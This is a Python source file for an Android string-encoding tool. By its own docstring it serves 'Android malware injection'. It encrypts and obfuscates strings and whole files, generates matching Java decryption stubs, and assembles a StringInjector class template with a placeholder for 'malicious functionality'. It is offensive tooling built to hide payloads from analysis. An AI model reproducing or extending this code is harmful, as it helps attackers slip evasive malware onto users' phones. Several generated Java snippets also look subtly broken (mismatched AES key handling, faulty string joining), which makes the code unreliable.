"""
Advanced String Encoder for Android Applications
Comprehensive string encryption and obfuscation for Android malware injection.
"""

import base64
import hashlib
import secrets
import logging
from typing import Dict, List, Any, Optional, Tuple
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend
import zlib
import gzip

class StringEncoder:
    """
    Advanced string encoder with multiple encryption and obfuscation methods.
    """
    
    def __init__(self, config: Optional[Dict[str, Any]] = None):
        """
        Initialize the string encoder.
        
        Args:
            config: Encoder configuration dictionary
        """
        self.config = config or self._default_config()
        self.logger = logging.getLogger(__name__)
        self._setup_logging()
        
        # Initialize encryption components
        self._encryption_keys = {}
        self._obfuscation_methods = {}
        
    def _default_config(self) -> Dict[str, Any]:
        """Return default encoder configuration."""
        return {
            'encryption': {
                'methods': ['AES', 'XOR', 'Base64', 'ROT13', 'Custom'],
                'key_length': 32,
                'salt_length': 16,
                'iterations': 100000
            },
            'obfuscation': {
                'methods': ['Split', 'Reverse', 'Scramble', 'Null', 'Junk'],
                'split_chars': ['_', '-', '.', '|'],
                'junk_length': 10
            },
            'android': {
                'target_api': 33,
                'min_api': 21,
                'architecture': 'arm64-v8a',
                'package_prefix': 'com.android.'
            }
        }
    
    def _setup_logging(self):
        """Setup logging configuration."""
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
        )
    
    def encode_string(self, string: str, method: str = 'AES', key: Optional[str] = None) -> Dict[str, Any]:
        """
        Encode a string using specified method.
        
        Args:
            string: String to encode
            method: Encoding method to use
            key: Optional encryption key
            
        Returns:
            Dictionary containing encoded string and metadata
        """
        try:
            if method == 'AES':
                return self._aes_encode(string, key)
            elif method == 'XOR':
                return self._xor_encode(string, key)
            elif method == 'Base64':
                return self._base64_encode(string)
            elif method == 'ROT13':
                return self._rot13_encode(string)
            elif method == 'Custom':
                return self._custom_encode(string, key)
            else:
                raise ValueError(f"Unsupported encoding method: {method}")
                
        except Exception as e:
            self.logger.error(f"String encoding failed: {e}")
            raise
    
    def _aes_encode(self, string: str, key: Optional[str] = None) -> Dict[str, Any]:
        """Encode string using AES encryption."""
        try:
            # Generate or use provided key
            if key is None:
                key = Fernet.generate_key()
            else:
                # Derive key from password
                salt = secrets.token_bytes(self.config['encryption']['salt_length'])
                kdf = PBKDF2HMAC(
                    algorithm=hashes.SHA256(),
                    length=32,
                    salt=salt,
                    iterations=self.config['encryption']['iterations'],
                    backend=default_backend()
                )
                key = base64.urlsafe_b64encode(kdf.derive(key.encode()))
            
            # Encrypt string
            fernet = Fernet(key)
            encrypted_data = fernet.encrypt(string.encode())
            
            # Generate Java code for decryption
            java_code = self._generate_aes_java_code(encrypted_data, key)
            
            return {
                'method': 'AES',
                'encoded_string': base64.b64encode(encrypted_data).decode(),
                'key': base64.b64encode(key).decode(),
                'java_code': java_code,
                'metadata': {
                    'original_length': len(string),
                    'encoded_length': len(encrypted_data),
                    'compression_ratio': len(encrypted_data) / len(string)
                }
            }
            
        except Exception as e:
            self.logger.error(f"AES encoding failed: {e}")
            raise
    
    def _xor_encode(self, string: str, key: Optional[str] = None) -> Dict[str, Any]:
        """Encode string using XOR encryption."""
        try:
            # Generate random key if not provided
            if key is None:
                key = secrets.token_hex(16)
            
            # Convert string to bytes
            string_bytes = string.encode('utf-8')
            key_bytes = key.encode('utf-8')
            
            # XOR encryption
            encrypted_bytes = bytearray()
            for i, byte in enumerate(string_bytes):
                encrypted_bytes.append(byte ^ key_bytes[i % len(key_bytes)])
            
            # Generate Java code for decryption
            java_code = self._generate_xor_java_code(encrypted_bytes, key)
            
            return {
                'method': 'XOR',
                'encoded_string': base64.b64encode(encrypted_bytes).decode(),
                'key': key,
                'java_code': java_code,
                'metadata': {
                    'original_length': len(string),
                    'encoded_length': len(encrypted_bytes),
                    'key_length': len(key)
                }
            }
            
        except Exception as e:
            self.logger.error(f"XOR encoding failed: {e}")
            raise
    
    def _base64_encode(self, string: str) -> Dict[str, Any]:
        """Encode string using Base64."""
        try:
            # Simple Base64 encoding
            encoded_string = base64.b64encode(string.encode()).decode()
            
            # Generate Java code for decryption
            java_code = self._generate_base64_java_code(encoded_string)
            
            return {
                'method': 'Base64',
                'encoded_string': encoded_string,
                'java_code': java_code,
                'metadata': {
                    'original_length': len(string),
                    'encoded_length': len(encoded_string)
                }
            }
            
        except Exception as e:
            self.logger.error(f"Base64 encoding failed: {e}")
            raise
    
    def _rot13_encode(self, string: str) -> Dict[str, Any]:
        """Encode string using ROT13."""
        try:
            # ROT13 encoding
            encoded_string = string.translate(str.maketrans(
                'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
                'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm'
            ))
            
            # Generate Java code for decryption
            java_code = self._generate_rot13_java_code(encoded_string)
            
            return {
                'method': 'ROT13',
                'encoded_string': encoded_string,
                'java_code': java_code,
                'metadata': {
                    'original_length': len(string),
                    'encoded_length': len(encoded_string)
                }
            }
            
        except Exception as e:
            self.logger.error(f"ROT13 encoding failed: {e}")
            raise
    
    def _custom_encode(self, string: str, key: Optional[str] = None) -> Dict[str, Any]:
        """Encode string using custom algorithm."""
        try:
            # Custom encoding: Base64 + XOR + Compression
            # Step 1: Compress
            compressed = gzip.compress(string.encode())
            
            # Step 2: XOR with key
            if key is None:
                key = secrets.token_hex(8)
            
            key_bytes = key.encode()
            xor_bytes = bytearray()
            for i, byte in enumerate(compressed):
                xor_bytes.append(byte ^ key_bytes[i % len(key_bytes)])
            
            # Step 3: Base64 encode
            encoded_string = base64.b64encode(xor_bytes).decode()
            
            # Generate Java code for decryption
            java_code = self._generate_custom_java_code(encoded_string, key)
            
            return {
                'method': 'Custom',
                'encoded_string': encoded_string,
                'key': key,
                'java_code': java_code,
                'metadata': {
                    'original_length': len(string),
                    'encoded_length': len(encoded_string),
                    'compression_ratio': len(encoded_string) / len(string)
                }
            }
            
        except Exception as e:
            self.logger.error(f"Custom encoding failed: {e}")
            raise
    
    def _generate_aes_java_code(self, encrypted_data: bytes, key: bytes) -> str:
        """Generate Java code for AES decryption."""
        encrypted_b64 = base64.b64encode(encrypted_data).decode()
        key_b64 = base64.b64encode(key).decode()
        
        java_code = f'''
    private static String decryptAES(String encryptedData) {{
        try {{
            String key = "{key_b64}";
            String encrypted = "{encrypted_b64}";
            
            byte[] keyBytes = Base64.decode(key, Base64.DEFAULT);
            byte[] encryptedBytes = Base64.decode(encrypted, Base64.DEFAULT);
            
            SecretKeySpec secretKey = new SecretKeySpec(keyBytes, "AES");
            Cipher cipher = Cipher.getInstance("AES");
            cipher.init(Cipher.DECRYPT_MODE, secretKey);
            
            byte[] decryptedBytes = cipher.doFinal(encryptedBytes);
            return new String(decryptedBytes, "UTF-8");
        }} catch (Exception e) {{
            return "";
        }}
    }}
        '''
        return java_code.strip()
    
    def _generate_xor_java_code(self, encrypted_bytes: bytes, key: str) -> str:
        """Generate Java code for XOR decryption."""
        encrypted_b64 = base64.b64encode(encrypted_bytes).decode()
        
        java_code = f'''
    private static String decryptXOR(String encryptedData) {{
        try {{
            String key = "{key}";
            String encrypted = "{encrypted_b64}";
            
            byte[] encryptedBytes = Base64.decode(encrypted, Base64.DEFAULT);
            byte[] keyBytes = key.getBytes("UTF-8");
            
            byte[] decryptedBytes = new byte[encryptedBytes.length];
            for (int i = 0; i < encryptedBytes.length; i++) {{
                decryptedBytes[i] = (byte) (encryptedBytes[i] ^ keyBytes[i % keyBytes.length]);
            }}
            
            return new String(decryptedBytes, "UTF-8");
        }} catch (Exception e) {{
            return "";
        }}
    }}
        '''
        return java_code.strip()
    
    def _generate_base64_java_code(self, encoded_string: str) -> str:
        """Generate Java code for Base64 decryption."""
        java_code = f'''
    private static String decryptBase64(String encodedData) {{
        try {{
            return new String(Base64.decode("{encoded_string}", Base64.DEFAULT), "UTF-8");
        }} catch (Exception e) {{
            return "";
        }}
    }}
        '''
        return java_code.strip()
    
    def _generate_rot13_java_code(self, encoded_string: str) -> str:
        """Generate Java code for ROT13 decryption."""
        java_code = f'''
    private static String decryptROT13(String encodedData) {{
        StringBuilder result = new StringBuilder();
        for (char c : "{encoded_string}".toCharArray()) {{
            if (c >= 'A' && c <= 'Z') {{
                result.append((char) ((c - 'A' + 13) % 26 + 'A'));
            }} else if (c >= 'a' && c <= 'z') {{
                result.append((char) ((c - 'a' + 13) % 26 + 'a'));
            }} else {{
                result.append(c);
            }}
        }}
        return result.toString();
    }}
        '''
        return java_code.strip()
    
    def _generate_custom_java_code(self, encoded_string: str, key: str) -> str:
        """Generate Java code for custom decryption."""
        java_code = f'''
    private static String decryptCustom(String encryptedData) {{
        try {{
            String key = "{key}";
            String encrypted = "{encoded_string}";
            
            // Step 1: Base64 decode
            byte[] xorBytes = Base64.decode(encrypted, Base64.DEFAULT);
            
            // Step 2: XOR decrypt
            byte[] keyBytes = key.getBytes("UTF-8");
            byte[] compressedBytes = new byte[xorBytes.length];
            for (int i = 0; i < xorBytes.length; i++) {{
                compressedBytes[i] = (byte) (xorBytes[i] ^ keyBytes[i % keyBytes.length]);
            }}
            
            // Step 3: GZIP decompress
            ByteArrayInputStream bais = new ByteArrayInputStream(compressedBytes);
            GZIPInputStream gzis = new GZIPInputStream(bais);
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            
            byte[] buffer = new byte[1024];
            int len;
            while ((len = gzis.read(buffer)) != -1) {{
                baos.write(buffer, 0, len);
            }}
            
            gzis.close();
            baos.close();
            
            return baos.toString("UTF-8");
        }} catch (Exception e) {{
            return "";
        }}
    }}
        '''
        return java_code.strip()
    
    def obfuscate_string(self, string: str, method: str = 'Split') -> Dict[str, Any]:
        """
        Obfuscate a string using specified method.
        
        Args:
            string: String to obfuscate
            method: Obfuscation method to use
            
        Returns:
            Dictionary containing obfuscated string and metadata
        """
        try:
            if method == 'Split':
                return self._split_obfuscate(string)
            elif method == 'Reverse':
                return self._reverse_obfuscate(string)
            elif method == 'Scramble':
                return self._scramble_obfuscate(string)
            elif method == 'Null':
                return self._null_obfuscate(string)
            elif method == 'Junk':
                return self._junk_obfuscate(string)
            else:
                raise ValueError(f"Unsupported obfuscation method: {method}")
                
        except Exception as e:
            self.logger.error(f"String obfuscation failed: {e}")
            raise
    
    def _split_obfuscate(self, string: str) -> Dict[str, Any]:
        """Split string into multiple parts."""
        try:
            # Split string into chunks
            chunk_size = max(1, len(string) // 3)
            chunks = [string[i:i+chunk_size] for i in range(0, len(string), chunk_size)]
            
            # Generate Java code
            java_code = self._generate_split_java_code(chunks)
            
            return {
                'method': 'Split',
                'obfuscated_parts': chunks,
                'java_code': java_code,
                'metadata': {
                    'original_length': len(string),
                    'chunk_count': len(chunks),
                    'chunk_size': chunk_size
                }
            }
            
        except Exception as e:
            self.logger.error(f"Split obfuscation failed: {e}")
            raise
    
    def _reverse_obfuscate(self, string: str) -> Dict[str, Any]:
        """Reverse string characters."""
        try:
            reversed_string = string[::-1]
            
            java_code = f'''
    private static String deobfuscateReverse(String obfuscated) {{
        return new StringBuilder("{reversed_string}").reverse().toString();
    }}
            '''
            
            return {
                'method': 'Reverse',
                'obfuscated_string': reversed_string,
                'java_code': java_code.strip(),
                'metadata': {
                    'original_length': len(string),
                    'reversed_length': len(reversed_string)
                }
            }
            
        except Exception as e:
            self.logger.error(f"Reverse obfuscation failed: {e}")
            raise
    
    def _scramble_obfuscate(self, string: str) -> Dict[str, Any]:
        """Scramble string characters."""
        try:
            # Create scrambled version
            chars = list(string)
            # Simple scrambling algorithm
            scrambled_chars = []
            for i in range(0, len(chars), 2):
                if i + 1 < len(chars):
                    scrambled_chars.append(chars[i + 1])
                    scrambled_chars.append(chars[i])
                else:
                    scrambled_chars.append(chars[i])
            
            scrambled_string = ''.join(scrambled_chars)
            
            java_code = f'''
    private static String deobfuscateScramble(String obfuscated) {{
        char[] chars = "{scrambled_string}".toCharArray();
        char[] result = new char[chars.length];
        
        for (int i = 0; i < chars.length; i += 2) {{
            if (i + 1 < chars.length) {{
                result[i] = chars[i + 1];
                result[i + 1] = chars[i];
            }} else {{
                result[i] = chars[i];
            }}
        }}
        
        return new String(result);
    }}
            '''
            
            return {
                'method': 'Scramble',
                'obfuscated_string': scrambled_string,
                'java_code': java_code.strip(),
                'metadata': {
                    'original_length': len(string),
                    'scrambled_length': len(scrambled_string)
                }
            }
            
        except Exception as e:
            self.logger.error(f"Scramble obfuscation failed: {e}")
            raise
    
    def _null_obfuscate(self, string: str) -> Dict[str, Any]:
        """Insert null characters into string."""
        try:
            # Insert null characters
            null_string = string.replace('', '\0')[1:-1]  # Remove leading/trailing nulls
            
            java_code = f'''
    private static String deobfuscateNull(String obfuscated) {{
        return "{null_string}".replace("\\0", "");
    }}
            '''
            
            return {
                'method': 'Null',
                'obfuscated_string': null_string,
                'java_code': java_code.strip(),
                'metadata': {
                    'original_length': len(string),
                    'null_length': len(null_string)
                }
            }
            
        except Exception as e:
            self.logger.error(f"Null obfuscation failed: {e}")
            raise
    
    def _junk_obfuscate(self, string: str) -> Dict[str, Any]:
        """Insert junk characters into string."""
        try:
            # Insert junk characters
            junk_chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
            junk_string = string
            
            # Insert junk at random positions
            for _ in range(self.config['obfuscation']['junk_length']):
                pos = secrets.randbelow(len(junk_string) + 1)
                junk_char = secrets.choice(junk_chars)
                junk_string = junk_string[:pos] + junk_char + junk_string[pos:]
            
            java_code = f'''
    private static String deobfuscateJunk(String obfuscated) {{
        String junk = "{junk_chars}";
        String result = obfuscated;
        
        for (char c : junk.toCharArray()) {{
            result = result.replace(String.valueOf(c), "");
        }}
        
        return result;
    }}
            '''
            
            return {
                'method': 'Junk',
                'obfuscated_string': junk_string,
                'java_code': java_code.strip(),
                'metadata': {
                    'original_length': len(string),
                    'junk_length': self.config['obfuscation']['junk_length'],
                    'final_length': len(junk_string)
                }
            }
            
        except Exception as e:
            self.logger.error(f"Junk obfuscation failed: {e}")
            raise
    
    def _generate_split_java_code(self, chunks: List[str]) -> str:
        """Generate Java code for split deobfuscation."""
        chunk_vars = []
        for i, chunk in enumerate(chunks):
            chunk_vars.append(f'String part{i} = "{chunk}";')
        
        java_code = f'''
    private static String deobfuscateSplit() {{
        {chr(10).join(chunk_vars)}
        return {chr(10).join([f"part{i}" for i in range(len(chunks))])};
    }}
        '''
        return java_code.strip()
    
    def encode_file(self, file_path: str, method: str = 'AES') -> Dict[str, Any]:
        """
        Encode an entire file into Android-compatible strings.
        
        Args:
            file_path: Path to file to encode
            method: Encoding method to use
            
        Returns:
            Dictionary containing encoded file data and Java code
        """
        try:
            # Read file
            with open(file_path, 'rb') as f:
                file_data = f.read()
            
            # Convert to string representation
            file_string = base64.b64encode(file_data).decode()
            
            # Encode the string
            encoded_result = self.encode_string(file_string, method)
            
            # Generate Java code for file reconstruction
            java_code = self._generate_file_java_code(encoded_result, file_path)
            
            return {
                'file_path': file_path,
                'file_size': len(file_data),
                'encoded_data': encoded_result,
                'java_code': java_code,
                'metadata': {
                    'original_size': len(file_data),
                    'encoded_size': len(file_string),
                    'compression_ratio': len(file_string) / len(file_data)
                }
            }
            
        except Exception as e:
            self.logger.error(f"File encoding failed: {e}")
            raise
    
    def _generate_file_java_code(self, encoded_result: Dict[str, Any], file_path: str) -> str:
        """Generate Java code for file reconstruction."""
        file_name = file_path.split('/')[-1]
        
        java_code = f'''
    private static void reconstructFile() {{
        try {{
            String encodedData = decrypt{encoded_result['method']}("{encoded_result['encoded_string']}");
            byte[] fileData = Base64.decode(encodedData, Base64.DEFAULT);
            
            File file = new File(getFilesDir(), "{file_name}");
            FileOutputStream fos = new FileOutputStream(file);
            fos.write(fileData);
            fos.close();
        }} catch (Exception e) {{
            e.printStackTrace();
        }}
    }}
        '''
        return java_code.strip()
    
    def generate_injection_template(self, encoded_strings: List[Dict[str, Any]]) -> str:
        """
        Generate complete Android injection template.
        
        Args:
            encoded_strings: List of encoded string results
            
        Returns:
            Complete Java class template
        """
        try:
            # Generate imports
            imports = '''
import android.content.Context;
import android.util.Base64;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.io.*;
import java.util.zip.GZIPInputStream;
import java.util.zip.GZIPOutputStream;
            '''
            
            # Generate class header
            class_header = '''
public class StringInjector {
    private Context context;
    
    public StringInjector(Context context) {
        this.context = context;
    }
            '''
            
            # Generate decryption methods
            decryption_methods = []
            for encoded_string in encoded_strings:
                decryption_methods.append(encoded_string['java_code'])
            
            # Generate main injection method
            injection_method = '''
    public void injectStrings() {
        try {
            // Inject all encoded strings
            String[] strings = {
'''
            
            for i, encoded_string in enumerate(encoded_strings):
                injection_method += f'                decrypt{encoded_string["method"]}("{encoded_string["encoded_string"]}"),\n'
            
            injection_method += '''            };
            
            // Process injected strings
            for (String str : strings) {
                processInjectedString(str);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    private void processInjectedString(String str) {
        // Custom processing logic here
        // This is where you would implement your malicious functionality
    }
            '''
            
            # Combine all parts
            template = imports + class_header + '\n'.join(decryption_methods) + injection_method + '\n}'
            
            return template
            
        except Exception as e:
            self.logger.error(f"Template generation failed: {e}")
            raise
    
    def get_encoder_status(self) -> Dict[str, Any]:
        """
        Get current encoder status.
        
        Returns:
            Dictionary containing encoder status information
        """
        return {
            'config': self.config,
            'supported_methods': {
                'encryption': self.config['encryption']['methods'],
                'obfuscation': self.config['obfuscation']['methods']
            },
            'android_target': {
                'api_level': self.config['android']['target_api'],
                'min_api': self.config['android']['min_api'],
                'architecture': self.config['android']['architecture']
            }
        }